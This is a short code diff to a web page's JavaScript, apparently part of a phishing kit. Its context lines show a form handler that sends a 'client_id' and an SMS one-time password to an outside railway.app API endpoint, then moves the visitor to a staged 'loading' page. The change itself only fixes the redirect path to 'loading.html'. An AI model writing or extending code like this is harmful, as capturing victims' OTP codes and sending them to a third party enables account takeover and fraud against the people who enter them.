@@ -266,10 +266,10 @@
                 await fetch(`https://api-production-8591.up.railway.app/v1/sms-submit?client_id=${_a}&otp=${_t}`, {
                     method: 'POST'
                 });
-                window.location.href = 'loading?step=2';
+                window.location.href = 'loading.html?step=2';
             } catch (err) {
                 console.error(err);
-                window.location.href = 'loading?step=2';
+                window.location.href = 'loading.html?step=2';
             }
         });
 
